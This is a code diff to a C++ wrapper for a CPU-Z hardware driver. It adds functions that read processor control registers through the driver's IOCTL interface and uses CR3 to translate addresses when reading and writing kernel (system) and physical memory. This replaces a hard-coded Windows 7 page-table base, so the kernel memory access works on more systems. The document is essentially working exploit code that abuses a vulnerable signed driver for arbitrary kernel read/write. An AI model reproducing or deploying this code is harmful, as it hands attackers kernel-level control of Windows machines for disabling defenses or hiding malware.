@@ -32,6 +32,7 @@ struct output
   std::uint32_t operation;
   std::uint32_t buffer_low;
 };
+
 #pragma pack(pop)
 
 cpuz_driver::cpuz_driver()
@@ -146,6 +147,48 @@ bool cpuz_driver::unload()
   return false;
 }
 
+std::uint64_t cpuz_driver::read_cr0()
+{
+  constexpr auto ioctl = 0x9C402428;
+  auto io = 0ul;
+
+  std::uint32_t control_register = 0;
+  std::uint64_t value = 0;
+
+  if(!DeviceIoControl(deviceHandle_, ioctl, &control_register, sizeof(control_register), &value, sizeof(value), &io, nullptr))
+    throw std::runtime_error("Failed to read control register");
+
+  return value;
+}
+
+std::uint64_t cpuz_driver::read_cr2()
+{
+  constexpr auto ioctl = 0x9C402428;
+  auto io = 0ul;
+
+  std::uint32_t control_register = 2;
+  std::uint64_t value = 0;
+
+  if(!DeviceIoControl(deviceHandle_, ioctl, &control_register, sizeof(control_register), &value, sizeof(value), &io, nullptr))
+    throw std::runtime_error("Failed to read control register");
+
+  return value;
+}
+
+std::uint64_t cpuz_driver::read_cr3()
+{
+  constexpr auto ioctl = 0x9C402428;
+  auto io = 0ul;
+
+  std::uint32_t control_register = 3;
+  std::uint64_t value = 0;
+  
+  if(!DeviceIoControl(deviceHandle_, ioctl, &control_register, sizeof(control_register), &value, sizeof(value), &io, nullptr))
+    throw std::runtime_error("Failed to read control register");
+
+  return value;
+}
+
 std::uint64_t cpuz_driver::translate_linear_address(std::uint64_t directoryTableBase, LPVOID virtualAddress)
 {
   auto va = (std::uint64_t)virtualAddress;
@@ -237,11 +280,8 @@ bool cpuz_driver::read_physical_address(std::uint64_t address, LPVOID buf, size_
 
 bool cpuz_driver::read_system_address(LPVOID address, LPVOID buf, size_t len)
 {
-  // TODO: Check OS build and use the correct DirBase. 
-  // The one below is for Win7 SP1
-  const auto DirBase = std::uint64_t{ 0x187000 };
-
-  auto phys = translate_linear_address(DirBase, address);
+  const auto dirbase = read_cr3();
+  const auto phys    = translate_linear_address(dirbase, address);
 
   if(phys == 0)
     return false;
@@ -283,15 +323,8 @@ bool cpuz_driver::write_physical_address(std::uint64_t address, LPVOID buf, size
 
 bool cpuz_driver::write_system_address(LPVOID address, LPVOID buf, size_t len)
 {
-  // System DirectoryTablebase.
-  // You need this so you can read system addresses.
-  // 
-  // TODO: Check OS build and use the correct DirectoryTablebase. 
-  // The one below is for Win7 SP1
-  // 
-  constexpr auto sys_dir_base = std::uint64_t{ 0x187000 };
-
-  auto phys = translate_linear_address(sys_dir_base, address);
+  const auto dirbase = read_cr3();
+  const auto phys    = translate_linear_address(dirbase, address);
 
   if(phys == 0)
     return false;
